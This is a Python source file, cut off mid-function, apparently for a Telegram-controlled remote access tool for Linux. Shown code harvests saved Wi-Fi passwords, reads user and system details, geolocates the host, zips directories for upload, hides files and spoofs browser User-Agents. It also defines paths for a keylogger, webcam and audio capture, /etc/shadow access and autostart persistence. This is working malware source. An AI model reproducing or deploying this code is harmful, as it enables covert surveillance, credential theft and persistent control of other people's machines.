#==================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 28.04.2026
#     PROJECT  : LINUX-TELEGRAM-BOT
#     PLATFORM : LINUX
#==================================#




import os
from   sys import (
    argv, 
    executable as pyexe,
    platform   as _sos
)


_env = os.environ


if not _sos.startswith('linux'):
    raise SystemError(f'OS NOT SUPPORTED ({_sos})')


if not _env.get('PATH'):
    _env['PATH'] = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'

__file__ = os.path.realpath(argv[0])




#
#-
#--
#---
#----
#-----
#------
#-------------------------|NECESSARILY|-------------------------#
# TELEGRAM BOT TOKEN
TOKEN: str = '' 


# PASSWORD FOR SESSION WITH TELEGRAM BOT 
# GENERATE: python -c "from hashlib import sha256;print(sha256('THERE IS PASSWORD'.encode()).hexdigest())"
PASSWORD: str = '' 


# RESPONSIBLE FOR ENCRYPTION INITIAL VALUES
SEED: int = 0  


# PATH TO SAVE TELEGRAM BOT
PATH: str = '' 
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
# HOW TO SAVE TELEGRAM BOT NAME IN PATH 
BOT_FILE_NAME: str = os.path.basename(__file__) 


# SERVICE NAME IN SYSTEMCTL FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_SERVICE_NAME: str = '' 


# SERVICE DESCRIPTION IN SYSTEMCTL FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_SERVICE_DESCRIPTION: str = ''


# TELEGRAM BOT WILL BE LAUNCHED IN (EXE IF BOT_EXE == True ELSE PYTHON) MODE
BOT_EXE: bool = False 
#----------------------------|END|---------------------------#
#------
#-----
#----
#---
#--
#-
#




LIBS = (
    'tabulate',
    'chardet',
    'requests',
    'psutil',
    'mouse',
    'keyboard',
    'pyperclip',
    'mss',
    'ffmpeg-python',
    'telebot'
)




__import__('warnings').filterwarnings('ignore')
__import__('logging').disable(50)




import shutil

from collections     import deque
from hashlib         import sha256
from threading       import Thread
from multiprocessing import Process
from datetime        import datetime
from stat            import filemode
from pwd             import getpwuid
from locale          import getlocale
from importlib.util  import find_spec
from json            import loads as json
from webbrowser      import open  as open_site
from codecs          import getincrementaldecoder
from re              import compile as re_exp, DOTALL
from shlex           import quote, split as split_args
from io              import BytesIO,       StringIO
from zipfile         import ZipFile,       ZIP_DEFLATED
from time            import sleep,         time,        ctime
from random          import seed,          randint,     choice
from subprocess      import run as sp_run, Popen,       PIPE,    DEVNULL
from socket          import gethostbyname as verify_domain,      AF_INET,    AF_INET6




mem      = memoryview
_namep   = os.path.basename
_absp    = os.path.realpath
_splitp  = os.path.split
_exist   = os.path.exists
_isfile  = os.path.isfile
_isdir   = os.path.isdir
_remove  = os.remove
_scandir = os.scandir




def invalid_type(name, val, valid):
    if isinstance(val, valid):
        return
    
    raise TypeError(f'({name}) must be ({valid.__name__})')




invalid_type('PATH',          PATH,          str )
invalid_type('BOT_EXE',       BOT_EXE,       bool)
invalid_type('BOT_FILE_NAME', BOT_FILE_NAME, str )


if not BOT_FILE_NAME:
    raise ValueError('(BOT_FILE_NAME) is empty')


if PATH.endswith('/'):
    PATH = PATH.rstrip('/')


if argv[-1].startswith('-n='):
    BOT_FILE_NAME = argv.pop()[3 :]




SESSION = {}


NULL = 'N/A'


FLAG_ROOT   = '-r'
FLAG_IMPORT = '-i'
FLAG_NAME   = '-n={}'


FILE_SZ_LIMIT = 49 << 20
FILE_ENCODING = 'UTF-8'


IS_ROOT  = os.getuid() == 0
SUDO_EXE = shutil.which(
        'pkexec' 
    if _env.get('WAYLAND_DISPLAY') or _env.get('DISPLAY') else 
        'sudo'
) or '/usr/bin/sudo'


PATH_UPTIME      = '/proc/uptime'
PATH_CPUINFO     = '/proc/cpuinfo'
PATH_DMI         = '/sys/class/dmi/id'
PATH_RUN_USER    = '/run/user'
PATH_PASSWD      = '/etc/passwd'
PATH_SHADOW      = '/etc/shadow'
PATH_ENVIRONMENT = '/etc/environment'
PATH_HOSTS       = '/etc/hosts'
PATH_SYSTEMCTL   = '/etc/systemd/system'
PATH_CRONTAB     = '/etc/crontab'
PATH_BASH        = '/bin/bash'


BOT_FILE_PATH          = f'{PATH}/{BOT_FILE_NAME}'
BOT_FILE_PATH_HIDDEN   = NULL
BOT_FILE_PATH_RECOVERY = f'/tmp/._{BOT_FILE_NAME}'


PATH_MEM   = f'{PATH}/mem'
PATH_SYS   = f'{PATH}/sys'
PATH_CONF  = f'{PATH_SYS}/conf'
PATH_TMP   = f'{PATH}/tmp'
PATH_SHARE = f'{PATH}/share'
PATH_VENV  = f'{PATH}/.venv'


CONFIG_TOKEN    = f'{PATH_CONF}/0'
CONFIG_PASSWORD = f'{PATH_CONF}/1'
CONFIG_SEED     = f'{PATH_CONF}/2'


FILE_PYTHON            = f'{PATH_VENV}/bin/python'
FILE_PIP               = f'{PATH_VENV}/bin/pip'

FILE_INIT              = f'{PATH_SYS}/.init'
FILE_AUTOSTART         = f'{PATH_SYS}/0'
FILE_KEYLOGGER_FLAG    = f'{PATH_SYS}/1'

FILE_APP_BLOCKER       = f'{PATH_TMP}/0'
FILE_KEYLOGGER         = f'{PATH_TMP}/1'
FILE_WEBCAM_SCREENSHOT = f'{PATH_TMP}/2'
FILE_AUDIO             = f'{PATH_TMP}/3'


KEYLOGGER_BUFFER_SIZE = 255


_osun = os.uname()

PID            = os.getpid() 
MACHINE        = _osun.machine
FIRMWARE       = 'UEFI' if _exist('/sys/firmware/efi') else 'BIOS'
PROCESSOR      = NULL
NODE           = _osun.nodename
USER           = _env.get('LOGNAME') or _env.get('USERNAME') or _env.get('USER') or NULL
LOGGED_USER    = 'root'
LANG, ENCODING = getlocale()
OS             = (_osun.sysname, _osun.release, _osun.version)
CHASSIS_TYPE   = (
         NULL,
    'VM',    'VM',
    'PC',    'PC',
         'PB',
    'PC',    'PC',
    'LP',    'LP',    
         'LP'
)


HTTP_HEADER = choice(({'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}))


GETME_URL = 'https://api.telegram.org/bot{}/getMe'


IPCONFIG_URL = 'https://ipinfo.io/json'
IPCONFIG_KEY = (
             'ip',         'org',
    'country',    'region',      'city',
    'postal',     'timezone',    'loc'
)




try:

    with open(PATH_CPUINFO, 'rb') as f:
        lb = b'model name'

        for l in f:
            if not l.startswith(lb):
                continue
            

            idx = l.find(b':')

            if idx == -1:
                continue


            PROCESSOR = l[idx + 2 : -1].decode()
            break

except OSError: 
    pass




def tabulate(r, headers, tablefmt):
    return _tabl(
        r, 
        headers          = headers, 
        tablefmt         = tablefmt,
        missingval       = NULL,
        disable_numparse = True,
        numalign         = 'left', 
        stralign         = 'left', 
        maxcolwidths     = 30
    )




def get_logged_user(*, _uh='/home/'):
    uid  = 0
    name = 'root'


    if not _isdir(PATH_RUN_USER):
        return (uid, name)

    
    with _scandir(PATH_RUN_USER) as d:
        for e in d:
            n = e.name

            if not n.isdigit():
                continue

            uid = int(n)


            try:

                pwu = getpwuid(uid)

                if pwu.pw_dir.startswith(_uh):
                    name = pwu.pw_name
                    break

            except (KeyError, OSError):
                continue


    return (uid, name)




def get_display(uid, *, _ch={}):
    if uid in _ch:
        return _ch[uid]


    r = (None, None)


    for p in psutil.process_iter(('uids', 'environ')):
        try:

            if p.info['uids'].real != uid:
                continue


            env = p.info.get('environ')

            if not env:
                continue


            if wayland := env.get('WAYLAND_DISPLAY'):
                r = ('WAYLAND_DISPLAY', wayland)
                break
            
            elif x11 := env.get('DISPLAY'):
                r = ('DISPLAY', x11)
                break
            
        except Exception:
            continue

    
    _ch[uid] = r
    return r




def parse_cmd(
    exp, cmd, 
    *, 
    _re=re_exp,
    _hs=str.__hash__, 
    _rs=str.rstrip, 
    _it=dict.items,
    _ch={}
):
    h = _hs(exp)
    f = _ch.get(h)
    

    if not f:
        f = _re(exp, flags=DOTALL).match
        _ch[h] = f

    
    if r := f(cmd):
        return {k: _rs(v) if v else None 
                for (k, v) in _it(r.groupdict())}
    
    return None




def http(url, json=False):
    try:
        req = http_get(url, headers=HTTP_HEADER, timeout=60)
        req.raise_for_status()

        return req.json() if json else mem(req.content)
    except Exception:
        return {} if json else None




def get_date(*, _fm='%H:%M %d.%m.%Y', _nw=datetime.now):
    try: 
        return _nw().strftime(_fm).split()
    except Exception: 
        return (NULL, NULL)
    



def decode_bytes(dt, *, _ck=4096, _ch=[None]):
    if not dt:
        return ''


    if not _ch[0]:
        _ch[0] = detect(dt[0 : 128].tobytes()
                        ).get('encoding') or ENCODING
    

    dc = getincrementaldecoder(_ch[0])(errors='replace')
    
    with StringIO() as buf:
        _de = dc.decode
        _wt = buf.write


        for i in range(0, len(dt), _ck):
            _wt(_de(dt[i : i + _ck]))
            

        _wt(_de(b'', final=True))
        return buf.getvalue()




def encrypt(dt, *, _d=ord, _c=chr):
    k0 = KEY[0]
    k1 = KEY[1]


    f = i = 0

    with StringIO() as buf:
        _wt = buf.write


        for c in dt:
            n = _d(c)  
            x = (n << k0) ^ ( ((k1 + f) + i) & 0xFF )
            f = (f ^ x) & 0xFF
            
            _wt(_c(x))
            i += 1
        
        
        return buf.getvalue()
    



def decrypt(dt, *, _d=ord, _c=chr):
    k0 = KEY[0]
    k1 = KEY[1]


    f = i = 0

    with StringIO() as buf:
        _wt = buf.write
        

        for c in dt:
            n = _d(c)     
            x = n ^ ( ((k1 + f) + i) & 0xFF )  
            o = x >> k0        
            f = (f ^ n) & 0xFF 
            
            _wt(_c(o))
            i += 1
        

        return buf.getvalue()
    



def mem_id(idx):
    return sha256( str(idx).encode() ).hexdigest()




def write_file(p, dt):
    if isinstance(dt, str):
        md = 'w'
        ec = FILE_ENCODING
    else:
        md = 'wb'
        ec = None


    with open(p, md, encoding=ec) as f:
        f.write(dt)
        f.flush()




def read_file(p, b=False):
    if b:
        md = 'rb'
        ec = er = None 
    else:
        md = 'r'
        ec = FILE_ENCODING
        er = 'replace'


    with open(p, md, encoding=ec, errors=er) as f:
        return mem(f.read()) if b else f.read()




def change_file(p, pattern, val, delete=False, enc=False):
    ok = False

    
    if not _isfile(p):
        return ok

    if not val.endswith('\n'):
        val += '\n'

    
    dt = []

    with open(p, 'r', encoding=FILE_ENCODING) as f:
        _au = dt.append
        _dc = decrypt


        for l in f:
            if enc:
                l = _dc(l)
            

            if pattern in l:
                if delete:
                    ok = True
                else:
                    _au(val)
                    ok = True
                    
            else:
                _au(l)


    if not delete and not ok:
        dt.append(val)
        ok = True


    if ok:
        with open(p, 'w', encoding=FILE_ENCODING) as f:
            _wt = f.write
            _en = encrypt


            for l in dt:
                _wt(_en(l) if enc else l)


    return ok
        



if _isfile(CONFIG_SEED):
    try:

        _sd = read_file(CONFIG_SEED)

        if _sd.isdigit():
            SEED = int(_sd)

    except Exception: 
        pass



seed(SEED)
KEY = (randint(1, 8), randint(1, 256))



if _isfile(CONFIG_TOKEN):
    try:
        TOKEN = decrypt(read_file(CONFIG_TOKEN))
    except Exception: 
        pass


if _isfile(CONFIG_PASSWORD):
    try:
        PASSWORD = decrypt(read_file(CONFIG_PASSWORD))
    except Exception: 
        pass




def mkdir(p, *, _md=os.mkdir):
    if isinstance(p, str) and not _isdir(p):
        _md(p)
    else:
        for d in p:
            if not _isdir(d):
                _md(d)




def shell(c, output=False, input=False, timeout=600, _new=False):
    try:
        ex = sp_run(
            c, 
            input   = input, 
            stdout  = PIPE if output else DEVNULL, 
            stderr  = DEVNULL, 
            timeout = timeout,
            shell   = True,
            start_new_session=_new
        )
    except Exception:
        return None if output else False


    if output:
        if not ex.stdout:
            return None
        
        return decode_bytes(mem(ex.stdout))


    return ex.returncode == 0




def autostart():
    if not _isfile(FILE_AUTOSTART):
        return
    

    try:
        dt = decrypt(read_file(FILE_AUTOSTART))
    except Exception:
        return
    

    sep = '\u200B'

    with StringIO(dt) as buf:
        for l in buf:
            try:
                _, p, arg, _ = l.split(sep)
                launch(p, '' if arg == 'none' else arg)
            except Exception:
                continue




def ls(
    p='.', 
    *, 
    _fm=filemode, 
    _gp=getpwuid, 
    _tm=ctime
):
    r  = []
    au = r.append
    

    try:
        sc = _scandir(p)
    except OSError:
        return ''

    for e in sc:
        try:

            st = e.stat()

            try:
                own = _gp(st.st_uid).pw_name
            except (KeyError, OSError):
                own = st.st_uid

            au((
                e.path, 

                _fm(st.st_mode),
                'DIR'  if e.is_dir()             else 'FILE', 
                'TRUE' if e.name.startswith('.') else 'FALSE', 

                own,
                f'{st.st_size} bytes', 
                _tm(st.st_mtime)  
            ))

        except Exception:
            continue

    sc.close()



    if r:
        return tabulate(
            r, 
            headers=(
                            'NAME', 
                'MODE',     'TYPE',    'HIDDEN', 
                'OWNER',    'SIZE',    'TIME'
            ), 
            tablefmt='grid'
        )
    
    return ''




def hide(p, *, _ret=False):
    p = _absp(p)
    dir, base = _splitp(p)

    if base.startswith('.'):
        return p if _ret else True


    newp = f'{dir}/.{base}'

    if _exist(newp):
        return p if _ret else False


    try:
        os.rename(p, newp)
        return newp if _ret else True
    except OSError:
        return p if _ret else False
    



def unhide(p):
    p = _absp(p)
    dir, base = _splitp(p)

    if not base.startswith('.'):
        return True


    newp = f'{dir}/{base[1 :]}'

    try:
        os.rename(p, newp)
        return True
    except OSError:
        return False




def iter_dir(
    p,
    *,
    _q=deque,
    _s=_scandir,
    _i=type(
            '', (),
            {
                '__slots__' : ('path',),
                '__init__'  : lambda t, w : t.__setattr__('path', w)
            }
    ),
    _x = OSError
):
    c = _q(( _i(p), ))

    u = c.appendleft
    g = c.pop

    while c:
        try:

            f = _s(g().path)

            try:
                for e in f:
                    if e.is_dir(follow_symlinks=False):
                        u(e)
                    else:
                        yield e
            finally:
                f.close()

        except _x:
            continue




def make_zip(dp='.', *, _mfs=25 << 20, _mzs=FILE_SZ_LIMIT):
    with BytesIO() as buf:
        with ZipFile(buf, 'w', ZIP_DEFLATED, compresslevel=9) as zf:
            _wt = zf.write

            for e in iter_dir(dp):
                try:
                    sz = e.stat().st_size

                    if sz > _mfs:
                        continue

                
                    p = e.path
                    _wt(p, p)


                    if buf.tell() >= _mzs:
                        break

                except OSError:
                    continue



        return mem(buf.getvalue())




def ipconfig(*, _ch=[None]):
    if not _ch[0]:
        req = http(IPCONFIG_URL, json=True)
        rgt = req.get

        _ch[0] = {
            'ip'       : rgt(IPCONFIG_KEY[0], NULL),
            'isp'      : rgt(IPCONFIG_KEY[1], NULL),
            'country'  : rgt(IPCONFIG_KEY[2], NULL),
            'region'   : rgt(IPCONFIG_KEY[3], NULL),
            'city'     : rgt(IPCONFIG_KEY[4], NULL),
            'postal'   : rgt(IPCONFIG_KEY[5], NULL),
            'timezone' : rgt(IPCONFIG_KEY[6], NULL),
            'location' : rgt(IPCONFIG_KEY[7], NULL)  
        }

    gbi = _ch[0]


    try:

        lci = []

        for (name, addr) in psutil.net_if_addrs().items():
            intr = {
                'name' : name, 
                'mac'  : NULL,
                'ipv4' : NULL, 
                'ipv6' : NULL
            }


            for i in addr:
                fm = i.family

                if fm == AF_INET:
                    intr['ipv4'] = i.address or NULL 

                elif fm == AF_INET6:
                    intr['ipv6'] = i.address or NULL 

                elif fm == psutil.AF_LINK:
                    intr['mac'] = (i.address or NULL).upper()
            

            lci.append(intr)

    except Exception:
        lci = None



    with StringIO() as buf:
        buf.write('(IPCONFIG):\n')


        if gbi:
            buf.write(f'''\t((GLOBAL)):
\t\tIP       : {gbi["ip"]}
\t\tISP      : {gbi["isp"]}
\t\tCOUNTRY  : {gbi["country"]}
\t\tREGION   : {gbi["region"]}
\t\tCITY     : {gbi["city"]}
\t\tPOSTAL   : {gbi["postal"]}
\t\tTIMEZONE : {gbi["timezone"]}
\t\tLOCATION : {gbi["location"]}''')
            

        if lci:
            buf.write('\n\n\t((LOCAL)):\n')

            for i in lci:
                buf.write(
f'''\t\tIFACE : {i["name"]}
\t\tMAC   : {i["mac"]}
\t\tIPV4  : {i["ipv4"]}
\t\tIPV6  : {i["ipv6"]}
\n''')


        return buf.getvalue()




def route():
    r = ([], [])


    if out := shell('ip -j -4 route', output=True):
        au = r[0].append

        for i in json(out):
            g = i.get

            au((
                g('dev',      NULL),
                g('dst',      NULL),
                g('gateway',  NULL),
                g('prefsrc',  NULL),
                g('protocol', NULL).upper(),
                g('scope',    NULL).upper(),
                g('metric',   NULL)
            ))

    if out := shell('ip -j -6 route', output=True):
        au = r[1].append

        for i in json(out):
            g = i.get

            au((
                g('dev',      NULL),
                g('dst',      NULL),
                g('pref',     NULL).upper(),
                g('protocol', NULL).upper(),
                g('metric',   NULL)
            ))       



    with StringIO() as buf:
        if r[0]:
            buf.write(tabulate(
                r[0], 
                headers=(
                    'INTERFACE',    'IPV4-DST',    'GATEWAY',
                    'SRC',          'PROTOCOL',    'SCOPE', 
                                    'METRIC'
                ), 
                tablefmt='grid'
            ))
                    
        if r[1]:
            if buf.tell():
                buf.write('\n\n\n')
        
            buf.write(tabulate(
                r[1], 
                headers=(
                    'INTERFACE',    'IPV6-DST',    'PREFERENCE', 
                            'PROTOCOL',    'METRIC'
                ), 
                tablefmt='grid'
            ))
                

        return buf.getvalue()




def arp():
    r = []


    out = shell('ip -j neigh', output=True)
    
    if not out:
        return ''
    

    for i in json(out):
        g = i.get

        r.append((
           g('dst',    NULL),
           g('lladdr', NULL).upper(),
           g('dev',    NULL),
           g('state', [NULL])[0]
        ))



    if r:
        return tabulate(
            r, 
            headers=('IP', 'MAC', 'INTERFACE', 'STATUS'), 
            tablefmt='grid'
        )
    
    return ''




def netstat():
    r = []


    out = shell('netstat -tunp', output=True)

    if not out:
        return ''
    

    prot = ('tcp', 'udp')

    with StringIO(out) as buf:
        au = r.append

        for l in buf:
            n = l.split()

            if (len(n) < 7) or (n[0] not in prot):
                continue

            au((
                    n[6],
                n[0].upper(),
                n[3],   n[4],
                    n[5]
            ))
    


    if r:
        return tabulate(
            r, 
            headers=(
                'PID',    'PROTOCOL',    'LOCAL', 
                    'FOREIGN',    'STATUS'
            ), 
            tablefmt='grid'
        )

    return ''




def wifi():
    r = []


    out = shell('nmcli -t -e no -f SSID,CHAN,RATE,MODE,SECURITY,SIGNAL,BSSID dev wifi list', output=True)

    if not out:
        return ''
    

    with StringIO(out) as buf:
        au = r.append

        for l in buf:
            n = l.split(':', 6) 

            if len(n) < 7:
                continue

            au((
                n[0] or '<hidden>',
                n[6].rstrip(),
                n[1],    n[2],
                n[3],    n[4],
                    n[5]
            ))



    if r:
        r.sort(key=lambda s: s[6], reverse=True)
        return tabulate(
            r, 
            headers=(
                'SSID',    'BSSID',    'CHANNEL', 
                'RATE',    'MODE',     'SECURITY', 
                           'SIGNAL'
            ), 
            tablefmt='grid'
        )

    return ''




def wifi_password():
    r = []


    out = shell('nmcli -t -f NAME,TYPE connection show', output=True)

    if not out:
        return ''
    

    lb = '802-11-wireless'
    
    with StringIO(out) as buf:
        au = r.append

        for l in buf:
            try:
                ssid, wtyp = l.split(':', 1)
            except ValueError:
                continue

            if not wtyp.startswith(lb):
                continue


            prof = ssid.replace('\\:', ':')


            psk = shell(f'nmcli -s -g {lb}-security.psk connection show {quote(prof)}', output=True)
            psk = (psk or '').strip()

            if not psk or (psk == '--'):
                continue

            au((prof, psk))
    


    if r:
        return tabulate(
            r, 
            headers=('SSID', 'PASSWORD'), 
            tablefmt='grid'
        )

    return ''




def get_user(user=None):
    try:
        out = read_file(PATH_PASSWD)
    except OSError:
        return ''
    

    sk = ('nologin', 'false', 'sync')
    
    with StringIO(out) as buf, StringIO() as r:
        r.write('(USER):\n')

        for l in buf:
            i = l.split(':')

            if len(i) != 7:
                continue
            

            name, _, uid, gid, _, home, shll = i
            shll = shll.rstrip()


            if (
                (user and (name != user)) or 
                (int(uid) < 1000)         or 
                not _isdir(home)          or
                shll.endswith(sk)
            ):
                continue
            

            r.write(
f'''\tNAME  : {name}
\tUID   : {uid}
\tGID   : {gid}
\tDIR   : {home}
\tSHELL : {shll}
\n''')

        

        return r.getvalue()




def uptime():
    try:
        s = read_file(PATH_UPTIME)
        s = float(s[: s.find(' ')])
    except (ValueError, OSError):
        return NULL


    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m    = s // 60


    with StringIO() as r:
        if d: r.write(f'{int(d)}d,')
        if h: r.write(f'{int(h)}h,')
        if m: r.write(f'{int(m)}m')
        
        return r.getvalue() or '0m'




def systeminfo():
    init_user()

    with StringIO() as buf:
        try:
            idx     = int(read_file(f'{PATH_DMI}/chassis_type'))
            chassis = CHASSIS_TYPE[idx]
        except (ValueError, IndexError, OSError):
            chassis = NULL
        

        buf.write(f'''(SYSTEM):
\tUPTIME           : {uptime()}
\tCHASSIS          : {chassis}
\tMACHINE          : {MACHINE}
\tFIRMWARE         : {FIRMWARE}
\tOS               : {OS[0]} {OS[1]} {OS[2]}
\tNODE             : {NODE}
\tUSER             : {USER}
\tLOGGED USER      : {LOGGED_USER}
\tLANG             : {LANG}
\tENCODING         : {ENCODING}
''')
        
        

        if guser := get_user():
            buf.write(f'\n{guser}')
        else:
            buf.write('\n(USER):\n')



        buf.write(f'{"" if guser else "\n"}{ipconfig()}')



        try:
            bios_vendor = read_file(f'{PATH_DMI}/bios_vendor').rstrip()
        except OSError:
            bios_vendor = NULL

        try:
            bios_version = read_file(f'{PATH_DMI}/bios_version').rstrip()
        except OSError:
            bios_version = NULL

        try:
            bios_date = read_file(f'{PATH_DMI}/bios_date').rstrip()
        except OSError:
            bios_date = NULL


        buf.write(f'''(BIOS):
\tVENDOR  : {bios_vendor}
\tVERSION : {bios_version}
\tDATE    : {bios_date}
''')



        try:
            baseboard_product = read_file(f'{PATH_DMI}/board_name').rstrip()
        except OSError:
            baseboard_product = NULL

        try:
            baseboard_vendor = read_file(f'{PATH_DMI}/board_vendor').rstrip()
        except OSError:
            baseboard_vendor = NULL

        try:
            baseboard_version = read_file(f'{PATH_DMI}/board_version').rstrip()
        except OSError:
            baseboard_version = NULL        
        

        buf.write(f'''\n(BASEBOARD):
\tPRODUCT : {baseboard_product}
\tVENDOR  : {baseboard_vendor}
\tVERSION : {baseboard_version}
''')
        


        buf.write('\n(BATTERY):\n')
  
        if bat := psutil.sensors_battery():
            tl   = NULL
            secs = bat.secsleft

            if (secs is not None) and (secs >= 0):
                tl = f'{secs // 60}m'


            buf.write(
f'''\tPERCENT    : {NULL if bat.percent is None else int(bat.percent)}%
\tPLUGGED IN : {"TRUE" if bat.power_plugged else "FALSE"}
\tTIME LEFT  : {tl}
''')
            

    
        cfreq = psutil.cpu_freq()
        cperc = psutil.cpu_percent()

        mhz = (
                (f'cur({int(cfreq.current)})/' 
                 f'min({int(cfreq.min)})/'
                 f'max({int(cfreq.max)}) MHz')
            if cfreq else 
                NULL
        )
        
        buf.write(f'''\n(CPU):
\tNAME      : {PROCESSOR}
\tCORE      : {psutil.cpu_count(False) or NULL}
\tFREQUENCY : {mhz}
\tUSAGE     : {NULL if cperc is None else int(cperc)}%
''')
        


        buf.write('\n(GPU):\n')
        gpu = []

        if out := shell('lspci -v', output=True):
            with StringIO(out) as lsp:
                dv = [NULL, NULL, NULL]
                lb = ('VGA', '3D ')
                sk = True


                for l in lsp:
                    if sk and (l[8 : 11] not in lb):
                        continue


                    if l.startswith('\tSubsystem'):
                        dv[0] = l[12 : -1]

                    elif l.startswith('\tFlags'):
                        dv[1] = l[8 : -1]

                    elif l.startswith('\tKernel driver'):
                        dv[2] = l[23 : -1]

        
                    if sk := l == '\n':
                        gpu.append(dv)
                        dv = [NULL, NULL, NULL]
            

        if gpu:
            for v in gpu:
                buf.write(
f'''\tNAME   : {v[0]}
\tFLAG   : {v[1]}
\tDRIVER : {v[2]}
\n''')
        

   
        buf.write(f'{"" if gpu else "\n"}(RAM):\n')
 
        if pmem := psutil.virtual_memory():
            buf.write(
f'''\tTOTAL : {NULL if pmem.total   is None else pmem.total >> 30} GiB
\tUSED  : {    NULL if pmem.used    is None else pmem.used  >> 30} GiB
\tFREE  : {    NULL if pmem.free    is None else pmem.free  >> 30} GiB
\tUSAGE : {    NULL if pmem.percent is None else int(pmem.percent)}%
''')
            


        buf.write('\n(SWAP):\n')

        if pswap := psutil.swap_memory():
            buf.write(
f'''\tTOTAL : {NULL if pswap.total   is None else pswap.total >> 30} GiB
\tUSED  : {    NULL if pswap.used    is None else pswap.used  >> 30} GiB
\tFREE  : {    NULL if pswap.free    is None else pswap.free  >> 30} GiB
\tUSAGE : {    NULL if pswap.percent is None else int(pswap.percent)}%
''')
            


        buf.write('\n(DISK):\n')

        if pdisk := psutil.disk_partitions():
            fdu = psutil.disk_usage

            for d in pdisk:
                try:
                    duse = fdu(d.mountpoint)
                except Exception:
                    continue
                

                tl = duse.total >> 30 if duse.total else -1

                if tl <= 0:
                    continue


                buf.write(
f'''\tNAME         : {d.device if d.device else NULL}
\tMOUNT OPTION : {    d.opts   if d.opts   else NULL}
\tFILE SYSTEM  : {    d.fstype if d.fstype else NULL}
\tTOTAL        : {tl                                                } GiB
\tUSED         : {NULL if duse.used    is None else duse.used  >> 30} GiB
\tFREE         : {NULL if duse.free    is None else duse.free  >> 30} GiB
\tUSAGE        : {NULL if duse.percent is None else int(duse.percent)}%
\n''')
        


        return buf.getvalue()
    



def modprobe(c, mod=None):
    match c:
